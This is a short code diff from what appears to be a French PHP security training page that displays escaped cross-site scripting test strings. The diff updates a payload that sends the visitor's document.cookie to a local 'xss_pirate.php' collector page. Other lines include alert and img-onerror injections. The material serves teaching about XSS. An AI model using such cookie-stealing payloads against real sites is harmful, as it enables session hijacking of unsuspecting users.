@@ -50,7 +50,7 @@
         <p>Test 3 : <?= htmlentities('<script>alert("Coucou la faille XSS ?");</script>') ?></p>
         <p>Test 4 : <?= htmlentities('<script>alert("Cookies = " + document.cookie);</script>') ?></p>
         <p>Test 5 : <?= htmlentities('<script>console.log("Cookies = " + document.cookie);</script>') ?></p>
-        <p>Test 6 : <?= htmlentities('<script>window.location.replace("http://localhost/formation/afpa/security_php/xss/xss_pirate.php?cookies=" + document.cookie);</script>') ?></p>
+        <p>Test 6 : <?= htmlentities('<script>window.location.replace("http://localhost/formation/next2024/next2024-security/xss/xss_pirate.php?cookies=" + document.cookie);</script>') ?></p>
         <p>Test 7 : <?= htmlentities('<img src="aaaaa" onerror="alert(\'Idem sans balise script\');">') ?></p>
 
 
